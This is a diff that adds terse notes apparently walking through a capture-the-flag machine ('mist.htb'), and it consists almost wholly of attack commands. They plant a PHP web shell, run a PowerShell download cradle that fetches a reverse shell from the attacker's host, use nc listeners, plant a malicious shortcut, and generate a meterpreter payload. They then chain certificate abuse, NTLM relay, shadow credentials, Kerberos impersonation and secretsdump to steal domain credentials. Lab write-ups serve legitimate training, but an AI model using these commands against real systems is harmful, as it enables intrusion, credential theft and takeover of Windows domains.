@@ -1,0 +1,63 @@
+-- Until get the first shell
+http://<ip>/data/settings/modules/albums has admin_backup.php
+It can be read by command: curl http://<ip>/data/modules/albums_getimage.php?image=admin_backup.php -> get sha hash
+Log in to http://<ip>/login.php
+
+mkdir <dirname>
+echo '<?php system($_REQUEST['cmd']); ?>' > <dirname>/<name.php>
+zip -r <zipfile> <dirname>
+Install module -> upload this zip file
+copy nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 and delete 1,2,4 line and change ip, port, and variable name(bypass filtering) -> <shellname>.ps1
+echo 'IXE((New-Object Net.WebClient).DownloadString('http://<myip>:8000/<shellname>.ps1'))' > cradle
+python3 -m http.server
+rlwrap nc -nlvp <port>
+cat cradle | iconv -t utf16le | base64 -w0; echo -> copy output1 -> http://<ip>/data/modules/<dirname>/<name.php>?cmd=powershell -enc <output1>
+
+-- Until get brandon shell
+local: rlwrap nc -nlvp <port>
+cd C:\Common*
+$objshell = new-object -ComObject WScript.Shell;
+$lnk = $objshell.createshortcut("C:\Common Applications\Calculator.lnk");
+$lnk.targetpath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
+$lnk.arguments = "-Nop -sta -noni -w hidden -encodedCommand <output1>"
+$lnk.save()
+Wait for 1~2min
+
+-- Basic network and tool setup
+Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -FilterXPath "*[System[(EventID=5007)]]" | Where-Object { $_.Message -like "*exclusion*" } | Select-Object Message | FL
+-> This shows C:\xampp\htdocs is excluded from Defender scanning
+local: msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<myip> lport=<myport> -f exe > shell.exe
+local: msfconsole; use exploit/multi/handler; set lhost <myip>; set lport <myport>; set payload windows/x64/meterpreter/reverse_tcp; run
+upload chisel.exe, Rubeus.exe, SharpHound.exe, certify.exe, shell.exe
+.\shell.exe -> get meterpreter shell(Robust)
+
+local: ./chisel server --reverse --socks5 --port <myport>
+.\chisel.exe client <myip>:<myport> R:socks
+proxychains nxc smb 192.168.100.100 shows output
+
+-- Get ntlm hash of brandon
+.\certify.exe find /enrollable -> Can find user authentication template
+.\certify.exe request /ca:DC01\mist-DC01-CA /template:User -> copy and save it locally as brandon.pem
+download brandon.pem
+local: openssl pkcs12 -in brandon.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out brandon.pfx
+upload brandon.pfx
+.\Rubeus.exe asktgt /user:brandon.keywarp /certificate:brandon.pfx /getcredentials /nowrap /show -> Get ntlm hash of brandon(Do not expire)
+
+-- nxc using ntlm hash
+proxychains nxc smb 192.168.100.100 -u brandon.keywarp -H <ntlm> -> can sign in
+proxychains nxc ldap 192.168.100.100 -u brandon.keywarp -H <ntlm> -M ldap-checker -> ldap signing not enforced
+proxychains nxc ldap 192.168.100.100 -u brandon.keywarp -H <ntlm> -M maq -> machineaccountquota 0
+
+-- ntlm relay
+.\chisel.exe client <myip>:<myport> <any port on ms01 like 9999>:127.0.0.1:80
+proxychains4 /home/parrot/Documents/mist/impacket/examples/ntlmrelayx.py -debug -t ldaps://192.168.100.100 -i -smb2support -domain mist.htb
+mcs EtwStartWebClient.cs -> upload EtwStartWebClient.exe and run
+proxychains4 ntlmrelayx.py -debug -t ldaps://192.168.100.100 -i -smb2support -domain mist.htb
+nc 127.0.0.1 11000; clear_shadow_creds MS01$; set_shadow_creds MS01$; -> get .pfx file and password
+
+.\Rubeus.exe asktgt /user:MS01$ /certificate:<.pfx> /getcredentials /show /nowrap /password:<pass> -> get ntlm hash of MS01$
+.\Rubeus.exe asktgt /nowrap /user:"ms01$" /rc4:2FF60EF11A5396F71662A2D72C1B8621
+.\Rubeus.exe s4u /self /nowrap /impersonateuser:Administrator /altservice:"cifs/ms01.mist.htb" /ticket:ms01.tgt.kirbi /outfile:ms01.s4u.kirbi
+ticketConverter ms01.s4u.kirbi ms01.ccache
+export KRB5CCNAME=ms01.ccache
+proxychains secretsdump.py administrator@ms01.mist.htb -k -no-pass
